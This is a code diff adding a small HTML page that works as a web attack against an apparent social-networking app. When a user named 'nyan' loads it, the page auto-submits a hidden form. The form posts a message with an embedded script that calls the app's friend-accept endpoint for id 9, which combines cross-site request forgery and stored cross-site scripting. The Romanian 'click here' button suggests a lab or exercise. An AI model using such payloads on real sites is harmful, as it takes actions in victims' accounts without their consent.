@@ -1,0 +1,22 @@
+<form id="myForm" method="post" action="/inside/message/send/1">
+    <textarea name="message">
+
+        <script>
+            $.get("/inside/friends/accept?id=9", function(data) {
+		    // reload the page to see your new friends
+		    window.location.reload();
+	    });
+        </script>
+
+    </textarea>
+    <button type="submit"> Apasa aici !</button>
+</form>
+
+<script>
+    $(function() {
+        if (window.authUserName == 'nyan') {
+            console.log("mesaj primit de catre nyam");
+            $('#myForm').submit();
+        }
+    })
+</script>
